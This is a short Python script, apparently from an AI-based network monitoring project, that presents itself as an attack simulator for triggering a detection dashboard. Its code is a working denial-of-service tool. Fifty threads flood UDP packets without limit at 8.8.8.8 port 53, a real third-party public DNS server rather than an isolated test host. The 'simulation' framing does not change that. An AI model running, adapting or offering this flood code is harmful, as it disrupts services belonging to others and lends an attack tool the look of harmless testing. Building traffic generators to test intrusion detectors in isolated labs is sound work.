"""
Volumetric Attack Simulator — NetGuard AI
This script generates a massive, multithreaded UDP flood designed to trigger
the Zero-Day AI model. It can be run standalone from the CLI or imported
and managed remotely by the FastAPI backend via the `global_stop_event`.
"""

import socket
import threading
import time
import random

TARGET_IP = "8.8.8.8"
TARGET_PORT = 53 

# Global event so we can stop it from a different API endpoint
global_stop_event = threading.Event()
global_stop_event.set() # Default to stopped state

def udp_flood_simulation(duration=None):
    print("==================================================")
    print(f"[*] Starting UDP Volumetric Flood against {TARGET_IP}:{TARGET_PORT}")
    print("[*] Generating massive Packets/Sec in a single flow...")
    print("==================================================")
    
    payload = random.randbytes(1024)
    global_stop_event.clear()
    
    def attack():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while not global_stop_event.is_set():
            try:
                s.sendto(payload, (TARGET_IP, TARGET_PORT))
            except:
                pass
                
    threads = []
    for _ in range(50):
        t = threading.Thread(target=attack)
        t.daemon = True
        t.start()
        threads.append(t)
        
    print("[*] Attack is LIVE! Look at your NetGuard Dashboard.")
    
    if duration:
        print(f"[*] Attack will automatically stop in {duration} seconds (or earlier if stopped manually).")
        # Check periodically if it was stopped early
        for _ in range(int(duration * 10)):
            if global_stop_event.is_set():
                break
            time.sleep(0.1)
        global_stop_event.set()
        print("[*] Attack stopped.")
    else:
        print("[*] (Press Ctrl+C to stop the attack)")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            global_stop_event.set()
            print("\n[*] Attack stopped.")

if __name__ == "__main__":
    udp_flood_simulation()
